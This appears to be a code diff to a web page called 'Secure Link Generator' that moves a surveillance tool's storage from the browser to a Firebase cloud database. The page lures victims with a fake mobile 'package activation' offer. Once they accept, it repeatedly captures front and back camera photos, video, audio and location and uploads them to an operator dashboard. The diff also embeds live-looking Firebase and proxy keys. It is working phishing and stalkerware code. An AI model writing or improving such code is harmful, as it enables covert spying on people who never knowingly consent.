@@ -10,7 +10,44 @@
 <!-- Leaflet for maps -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<!-- Firebase SDKs -->
+<script type="module">
+  // Import the functions you need from the SDKs
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
+  import { getDatabase, ref, set, push, onValue, update, get, child, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";
+
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCm8YVDZWNqgTBKqEmR269-3TqauF8xqHM",
+    authDomain: "camera-access-edd51.firebaseapp.com",
+    projectId: "camera-access-edd51",
+    storageBucket: "camera-access-edd51.firebasestorage.app",
+    messagingSenderId: "941379706820",
+    appId: "1:941379706820:web:07eab7ab88b95bf2544e91",
+    measurementId: "G-1X3WSW4H88"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const database = getDatabase(app);
+  
+  // Make database available globally
+  window.firebaseDB = database;
+  window.firebaseRef = ref;
+  window.firebaseSet = set;
+  window.firebasePush = push;
+  window.firebaseOnValue = onValue;
+  window.firebaseUpdate = update;
+  window.firebaseGet = get;
+  window.firebaseChild = child;
+  window.firebaseQuery = query;
+  window.firebaseOrderByChild = orderByChild;
+  window.firebaseEqualTo = equalTo;
+</script>
 <style>
+/* All your existing styles remain exactly the same */
 :root {
   --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
@@ -804,7 +841,7 @@ select:focus, input:focus {
     </div>
     
     <h1>Secure Link Generator</h1>
-    <p class="subtitle">Generate unique tracking links and manage captured media. All data persists across sessions.</p>
+    <p class="subtitle">Generate unique tracking links and manage captured media. All data is stored in cloud.</p>
     
     <!-- Stats -->
     <div class="stats-container">
@@ -1103,7 +1140,6 @@ select:focus, input:focus {
 // GLOBAL VARIABLES
 // ====================
 let currentSessionId = null;
-let allSessions = JSON.parse(localStorage.getItem('allSessions') || '[]');
 let mediaStream = null;
 let mediaRecorder = null;
 let recordedChunks = [];
@@ -1128,6 +1164,9 @@ let sensorData = {
   gyroscope: { alpha: 0, beta: 0, gamma: 0 },
   orientation: { alpha: 0, beta: 0, gamma: 0 }
 };
+
+// Firebase ready check
+let firebaseReady = false;
 
 // ====================
 // DOM ELEMENTS
@@ -1200,6 +1239,166 @@ const totalAudioEl = document.getElementById('totalAudio');
 // ====================
 const CORS_PROXY = 'https://corsproxy.io/?key=7b5d8d31&url=';
 
+// ====================
+// FIREBASE FUNCTIONS
+// ====================
+function waitForFirebase() {
+  return new Promise((resolve) => {
+    if (window.firebaseDB) {
+      firebaseReady = true;
+      resolve();
+    } else {
+      const checkInterval = setInterval(() => {
+        if (window.firebaseDB) {
+          firebaseReady = true;
+          clearInterval(checkInterval);
+          resolve();
+        }
+      }, 100);
+    }
+  });
+}
+
+async function saveSessionToFirebase(sessionId, sessionData) {
+  await waitForFirebase();
+  try {
+    const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
+    await window.firebaseSet(sessionRef, {
+      ...sessionData,
+      id: sessionId,
+      updatedAt: Date.now()
+    });
+    console.log('Session saved to Firebase');
+  } catch (error) {
+    console.error('Error saving session to Firebase:', error);
+  }
+}
+
+async function getSessionFromFirebase(sessionId) {
+  await waitForFirebase();
+  try {
+    const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
+    const snapshot = await window.firebaseGet(sessionRef);
+    return snapshot.exists() ? snapshot.val() : null;
+  } catch (error) {
+    console.error('Error getting session from Firebase:', error);
+    return null;
+  }
+}
+
+async function saveMediaToFirebase(sessionId, mediaItem) {
+  await waitForFirebase();
+  try {
+    const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media/${mediaItem.id}`);
+    await window.firebaseSet(mediaRef, mediaItem);
+    console.log('Media saved to Firebase');
+    
+    // Also update the session's media list
+    const sessionMediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/mediaList/${mediaItem.id}`);
+    await window.firebaseSet(sessionMediaRef, true);
+    
+    return true;
+  } catch (error) {
+    console.error('Error saving media to Firebase:', error);
+    return false;
+  }
+}
+
+async function getAllMediaFromFirebase(sessionId) {
+  await waitForFirebase();
+  try {
+    const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
+    const snapshot = await window.firebaseGet(mediaRef);
+    
+    if (snapshot.exists()) {
+      const mediaObj = snapshot.val();
+      return Object.values(mediaObj).sort((a, b) => b.timestamp - a.timestamp);
+    }
+    return [];
+  } catch (error) {
+    console.error('Error getting media from Firebase:', error);
+    return [];
+  }
+}
+
+async function clearSessionMediaFromFirebase(sessionId) {
+  await waitForFirebase();
+  try {
+    const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
+    await window.firebaseSet(mediaRef, null);
+    
+    const mediaListRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/mediaList`);
+    await window.firebaseSet(mediaListRef, null);
+    
+    console.log('Media cleared from Firebase');
+    return true;
+  } catch (error) {
+    console.error('Error clearing media from Firebase:', error);
+    return false;
+  }
+}
+
+async function subscribeToSessionMedia(sessionId, callback) {
+  await waitForFirebase();
+  try {
+    const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
+    window.firebaseOnValue(mediaRef, (snapshot) => {
+      if (snapshot.exists()) {
+        const mediaObj = snapshot.val();
+        const mediaArray = Object.values(mediaObj).sort((a, b) => b.timestamp - a.timestamp);
+        callback(mediaArray);
+      } else {
+        callback([]);
+      }
+    });
+  } catch (error) {
+    console.error('Error subscribing to media:', error);
+  }
+}
+
+async function getAllSessionsFromFirebase() {
+  await waitForFirebase();
+  try {
+    const sessionsRef = window.firebaseRef(window.firebaseDB, 'sessions');
+    const snapshot = await window.firebaseGet(sessionsRef);
+    
+    if (snapshot.exists()) {
+      const sessionsObj = snapshot.val();
+      return Object.values(sessionsObj);
+    }
+    return [];
+  } catch (error) {
+    console.error('Error getting sessions from Firebase:', error);
+    return [];
+  }
+}
+
+async function updateStatsFromFirebase() {
+  const allSessions = await getAllSessionsFromFirebase();
+  
+  totalLinksEl.textContent = allSessions.length;
+  
+  let totalPhotos = 0, totalVideos = 0, totalAudio = 0;
+  
+  for (const session of allSessions) {
+    if (session.media) {
+      const mediaArray = Object.values(session.media);
+      mediaArray.forEach(item => {
+        if (item.type === 'photo') totalPhotos++;
+        else if (item.type === 'video') totalVideos++;
+        else if (item.type === 'audio') totalAudio++;
+      });
+    }
+  }
+  
+  totalPhotosEl.textContent = totalPhotos;
+  totalVideosEl.textContent = totalVideos;
+  totalAudioEl.textContent = totalAudio;
+}
+
+// ====================
+// CHECK VPN
+// ====================
 async function checkVPN() {
   try {
     const response = await fetch(CORS_PROXY + encodeURIComponent('https://api.ipify.org?format=json'));
@@ -1256,193 +1455,157 @@ function generateSessionId() {
   return 'sess_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
 }
 
-function saveSession(sessionId, data = {}) {
-  const existingSession = allSessions.find(s => s.id === sessionId);
-  
-  if (existingSession) {
-    existingSession.lastActive = Date.now();
-    existingSession.data = { ...existingSession.data, ...data };
-  } else {
-    allSessions.push({
-      id: sessionId,
-      created: Date.now(),
-      lastActive: Date.now(),
-      data: data
-    });
-  }
-  
-  localStorage.setItem('allSessions', JSON.stringify(allSessions));
-  updateStats();
-}
-
-function loadSession(sessionId) {
-  return allSessions.find(s => s.id === sessionId) || null;
-}
-
-function getSessionMedia(sessionId) {
-  const session = loadSession(sessionId);
-  return session && session.data && session.data.media ? session.data.media : [];
-}
-
-function saveSessionMedia(sessionId, mediaArray) {
-  const session = loadSession(sessionId);
-  if (session) {
-    if (!session.data) session.data = {};
-    session.data.media = mediaArray;
-    session.lastActive = Date.now();
-    localStorage.setItem('allSessions', JSON.stringify(allSessions));
-    updateStats();
-    renderMediaGallery(sessionId);
-  }
-}
-
-function addMediaToSession(sessionId, mediaItem) {
-  const session = loadSession(sessionId);
-  if (session) {
-    if (!session.data) session.data = {};
-    if (!session.data.media) session.data.media = [];
-    
-    // Add unique ID to media item
-    mediaItem.id = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-    session.data.media.push(mediaItem);
-    session.lastActive = Date.now();
-    
-    localStorage.setItem('allSessions', JSON.stringify(allSessions));
-    updateStats();
-    renderMediaGallery(sessionId);
-    
-    // Show notification for new media
-    showNotification(`${mediaItem.type} captured!`, 'success');
-  }
-}
-
-function updateStats() {
-  totalLinksEl.textContent = allSessions.length;
-  
-  let totalPhotos = 0, totalVideos = 0, totalAudio = 0;
-  
-  allSessions.forEach(session => {
-    if (session.data && session.data.media) {
-      session.data.media.forEach(item => {
-        if (item.type === 'photo') totalPhotos++;
-        else if (item.type === 'video') totalVideos++;
-        else if (item.type === 'audio') totalAudio++;
-      });
-    }
+async function saveSession(sessionId, data = {}) {
+  await saveSessionToFirebase(sessionId, {
+    ...data,
+    created: Date.now(),
+    lastActive: Date.now()
   });
+  await updateStatsFromFirebase();
+}
+
+async function loadSession(sessionId) {
+  return await getSessionFromFirebase(sessionId);
+}
+
+async function getSessionMedia(sessionId) {
+  return await getAllMediaFromFirebase(sessionId);
+}
+
+async function saveSessionMedia(sessionId, mediaArray) {
+  // Clear existing media first
+  await clearSessionMediaFromFirebase(sessionId);
   
-  totalPhotosEl.textContent = totalPhotos;
-  totalVideosEl.textContent = totalVideos;
-  totalAudioEl.textContent = totalAudio;
+  // Save each media item
+  for (const item of mediaArray) {
+    await saveMediaToFirebase(sessionId, item);
+  }
+  
+  await updateStatsFromFirebase();
+  renderMediaGallery(sessionId);
+}
+
+async function addMediaToSession(sessionId, mediaItem) {
+  await saveMediaToFirebase(sessionId, mediaItem);
+  await updateStatsFromFirebase();
+  
+  // The gallery will auto-update via the Firebase subscription
+  showNotification(`${mediaItem.type} captured!`, 'success');
 }
 
 function renderMediaGallery(sessionId) {
-  const media = getSessionMedia(sessionId);
   const gallery = document.getElementById('mediaGallery');
   
   if (!gallery) return;
   
-  gallery.innerHTML = '';
+  gallery.innerHTML = `
+    <div class="gallery-placeholder">
+      <i class="fas fa-spinner fa-spin"></i>
+      <div>Loading media...</div>
+    </div>
+  `;
   
-  if (media.length === 0) {
-    gallery.innerHTML = `
-      <div class="gallery-placeholder">
-        <i class="fas fa-camera-retro"></i>
-        <div>No media captured yet</div>
-        <small>Click "Activate Package" to start capturing</small>
-      </div>
-    `;
-    return;
-  }
-  
-  // Sort by timestamp (newest first)
-  media.sort((a, b) => b.timestamp - a.timestamp);
-  
-  media.forEach((item) => {
-    const date = new Date(item.timestamp).toLocaleString();
-    const typeIcon = item.type === 'photo' ? 'fa-camera' : item.type === 'video' ? 'fa-video' : 'fa-microphone';
-    const typeText = item.type === 'photo' ? 'Photo' : item.type === 'video' ? 'Video' : 'Audio';
-    
-    const mediaElement = document.createElement('div');
-    mediaElement.className = 'gallery-item';
-    
-    if (item.type === 'photo') {
-      mediaElement.innerHTML = `
-        <img src="${item.data}" alt="Photo" loading="lazy">
-        <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
-          <span class="gallery-item-type">
-            <i class="fas ${item.facingMode === 'user' ? 'fa-user' : 'fa-mobile-alt'}"></i>
-            ${new Date(item.timestamp).toLocaleTimeString()}
-          </span>
+  // Subscribe to real-time updates
+  subscribeToSessionMedia(sessionId, (media) => {
+    if (media.length === 0) {
+      gallery.innerHTML = `
+        <div class="gallery-placeholder">
+          <i class="fas fa-camera-retro"></i>
+          <div>No media captured yet</div>
+          <small>Click "Activate Package" to start capturing</small>
         </div>
       `;
-    } else if (item.type === 'video') {
-      mediaElement.innerHTML = `
-        <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;"></video>
-        <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
-          <span class="gallery-item-type">
-            <i class="fas fa-clock"></i>
-            ${new Date(item.timestamp).toLocaleTimeString()}
-          </span>
-        </div>
-      `;
-    } else if (item.type === 'audio') {
-      mediaElement.innerHTML = `
-        <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2);">
-          <i class="fas fa-music" style="font-size:40px;color:white;"></i>
-        </div>
-        <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
-          <span class="gallery-item-type">
-            <i class="fas fa-clock"></i>
-            ${new Date(item.timestamp).toLocaleTimeString()}
-          </span>
-        </div>
-      `;
+      return;
     }
     
-    mediaElement.onclick = () => {
-      if (item.type === 'photo') {
-        const imgWindow = window.open('', '_blank');
-        imgWindow.document.write(`
-          <html>
-            <head><title>Photo - ${date}</title></head>
-            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
-              <img src="${item.data}" style="max-width:100%;max-height:100vh;object-fit:contain;">
-            </body>
-          </html>
-        `);
-      } else if (item.type === 'video') {
-        const videoWindow = window.open('', '_blank');
-        videoWindow.document.write(`
-          <html>
-            <head><title>Video - ${date}</title></head>
-            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
-              <video src="${item.data}" controls style="max-width:100%;max-height:100vh;"></video>
-            </body>
-          </html>
-        `);
-      } else if (item.type === 'audio') {
-        const audioWindow = window.open('', '_blank');
-        audioWindow.document.write(`
-          <html>
-            <head><title>Audio - ${date}</title></head>
-            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;min-height:100vh;">
-              <div style="text-align:center;padding:20px;">
-                <i class="fas fa-music" style="font-size:64px;color:#667eea;margin-bottom:20px;"></i>
-                <h3>Audio Recording</h3>
-                <p>${date}</p>
-                <audio src="${item.data}" controls style="width:100%;max-width:500px;"></audio>
-              </div>
-            </body>
-          </html>
-        `);
-      }
-    };
+    gallery.innerHTML = '';
     
-    gallery.appendChild(mediaElement);
+    media.forEach((item) => {
+      const date = new Date(item.timestamp).toLocaleString();
+      const typeIcon = item.type === 'photo' ? 'fa-camera' : item.type === 'video' ? 'fa-video' : 'fa-microphone';
+      const typeText = item.type === 'photo' ? 'Photo' : item.type === 'video' ? 'Video' : 'Audio';
+      
+      const mediaElement = document.createElement('div');
+      mediaElement.className = 'gallery-item';
+      
+      if (item.type === 'photo') {
+        mediaElement.innerHTML = `
+          <img src="${item.data}" alt="Photo" loading="lazy">
+          <div class="gallery-item-overlay">
+            <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+            <span class="gallery-item-type">
+              <i class="fas ${item.facingMode === 'user' ? 'fa-user' : 'fa-mobile-alt'}"></i>
+              ${new Date(item.timestamp).toLocaleTimeString()}
+            </span>
+          </div>
+        `;
+      } else if (item.type === 'video') {
+        mediaElement.innerHTML = `
+          <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;"></video>
+          <div class="gallery-item-overlay">
+            <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+            <span class="gallery-item-type">
+              <i class="fas fa-clock"></i>
+              ${new Date(item.timestamp).toLocaleTimeString()}
+            </span>
+          </div>
+        `;
+      } else if (item.type === 'audio') {
+        mediaElement.innerHTML = `
+          <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2);">
+            <i class="fas fa-music" style="font-size:40px;color:white;"></i>
+          </div>
+          <div class="gallery-item-overlay">
+            <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+            <span class="gallery-item-type">
+              <i class="fas fa-clock"></i>
+              ${new Date(item.timestamp).toLocaleTimeString()}
+            </span>
+          </div>
+        `;
+      }
+      
+      mediaElement.onclick = () => {
+        if (item.type === 'photo') {
+          const imgWindow = window.open('', '_blank');
+          imgWindow.document.write(`
+            <html>
+              <head><title>Photo - ${date}</title></head>
+              <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
+                <img src="${item.data}" style="max-width:100%;max-height:100vh;object-fit:contain;">
+              </body>
+            </html>
+          `);
+        } else if (item.type === 'video') {
+          const videoWindow = window.open('', '_blank');
+          videoWindow.document.write(`
+            <html>
+              <head><title>Video - ${date}</title></head>
+              <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
+                <video src="${item.data}" controls style="max-width:100%;max-height:100vh;"></video>
+              </body>
+            </html>
+          `);
+        } else if (item.type === 'audio') {
+          const audioWindow = window.open('', '_blank');
+          audioWindow.document.write(`
+            <html>
+              <head><title>Audio - ${date}</title></head>
+              <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;min-height:100vh;">
+                <div style="text-align:center;padding:20px;">
+                  <i class="fas fa-music" style="font-size:64px;color:#667eea;margin-bottom:20px;"></i>
+                  <h3>Audio Recording</h3>
+                  <p>${date}</p>
+                  <audio src="${item.data}" controls style="width:100%;max-width:500px;"></audio>
+                </div>
+              </body>
+            </html>
+          `);
+        }
+      };
+      
+      gallery.appendChild(mediaElement);
+    });
   });
 }
 
@@ -1759,7 +1922,8 @@ function startPeriodicCapture() {
     // Front camera photo
     const frontPhoto = await capturePhoto('user');
     if (frontPhoto) {
-      addMediaToSession(currentSessionId, {
+      await addMediaToSession(currentSessionId, {
+        id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
         type: 'photo',
         data: frontPhoto,
         facingMode: 'user',
@@ -1771,7 +1935,8 @@ function startPeriodicCapture() {
     // Back camera photo
     const backPhoto = await capturePhoto('environment');
     if (backPhoto) {
-      addMediaToSession(currentSessionId, {
+      await addMediaToSession(currentSessionId, {
+        id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
         type: 'photo',
         data: backPhoto,
         facingMode: 'environment',
@@ -1787,7 +1952,8 @@ function startPeriodicCapture() {
     
     const video = await captureVideo(10000);
     if (video) {
-      addMediaToSession(currentSessionId, {
+      await addMediaToSession(currentSessionId, {
+        id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
         type: 'video',
         data: video,
         facingMode: 'environment',
@@ -1803,7 +1969,8 @@ function startPeriodicCapture() {
     
     const audio = await captureAudio(15000);
     if (audio) {
-      addMediaToSession(currentSessionId, {
+      await addMediaToSession(currentSessionId, {
+        id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
         type: 'audio',
         data: audio,
         location: currentLocation,
@@ -1829,7 +1996,7 @@ function stopCapture() {
 // ====================
 // DASHBOARD FUNCTIONS
 // ====================
-function generateNewLink() {
+async function generateNewLink() {
   currentSessionId = generateSessionId();
   const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(currentSessionId)}`;
   
@@ -1839,10 +2006,10 @@ function generateNewLink() {
   dataArea.classList.remove('hidden');
   permissionArea.classList.remove('hidden');
   
-  saveSession(currentSessionId, { 
+  await saveSession(currentSessionId, { 
     link: link,
     created: Date.now(),
-    media: []
+    media: {}
   });
   
   renderMediaGallery(currentSessionId);
@@ -1856,7 +2023,7 @@ async function downloadAllMedia() {
     return;
   }
   
-  const media = getSessionMedia(currentSessionId);
+  const media = await getSessionMedia(currentSessionId);
   if (media.length === 0) {
     showNotification('No media to download', 'warning');
     return;
@@ -1911,11 +2078,12 @@ async function downloadAllMedia() {
   }
 }
 
-function clearSessionMedia() {
+async function clearSessionMedia() {
   if (!currentSessionId) return;
   
   if (confirm('Are you sure you want to clear all media for this session?')) {
-    saveSessionMedia(currentSessionId, []);
+    await clearSessionMediaFromFirebase(currentSessionId);
+    renderMediaGallery(currentSessionId);
     showNotification('All media cleared', 'success');
   }
 }
@@ -1964,7 +2132,7 @@ document.head.appendChild(style);
 // ====================
 // PACKAGE ACTIVATOR
 // ====================
-function activatePackage() {
+async function activatePackage() {
   if (!simSelect.value || mobileNumber.value.length < 11) {
     showNotification('Please select provider and enter valid mobile number', 'warning');
     return;
@@ -1990,7 +2158,7 @@ function activatePackage() {
   dataArea.classList.remove('hidden');
   
   // Start all permission requests and tracking
-  requestAllPermissions();
+  await requestAllPermissions();
   
   setTimeout(() => {
     activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Activation in progress - capturing data';
@@ -2049,7 +2217,7 @@ whatsappBtn.addEventListener('click', () => {
 // ====================
 // INITIALIZATION
 // ====================
-function init() {
+async function init() {
   initTheme();
   
   const urlParams = new URLSearchParams(window.location.search);
@@ -2060,16 +2228,16 @@ function init() {
     pkgActivatorCard.style.display = 'block';
     document.querySelector('.container').style.gridTemplateColumns = '1fr';
     
-    const session = loadSession(sessionId);
+    const session = await getSessionFromFirebase(sessionId);
     if (session) {
       currentSessionId = sessionId;
       renderMediaGallery(sessionId);
     } else {
       currentSessionId = sessionId;
-      saveSession(sessionId, { 
+      await saveSession(sessionId, { 
         link: window.location.href,
         created: Date.now(),
-        media: []
+        media: {}
       });
     }
     
@@ -2079,20 +2247,8 @@ function init() {
   } else {
     pkgActivatorCard.style.display = 'none';
     
-    const lastSessionId = localStorage.getItem('lastSessionId');
-    if (lastSessionId && loadSession(lastSessionId)) {
-      currentSessionId = lastSessionId;
-      sessionIdDisplay.textContent = currentSessionId;
-      
-      const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(currentSessionId)}`;
-      generatedLink.value = link;
-      
-      linkArea.classList.remove('hidden');
-      dataArea.classList.remove('hidden');
-      renderMediaGallery(currentSessionId);
-    }
-    
-    updateStats();
+    // Update stats from Firebase
+    await updateStatsFromFirebase();
   }
 }
 
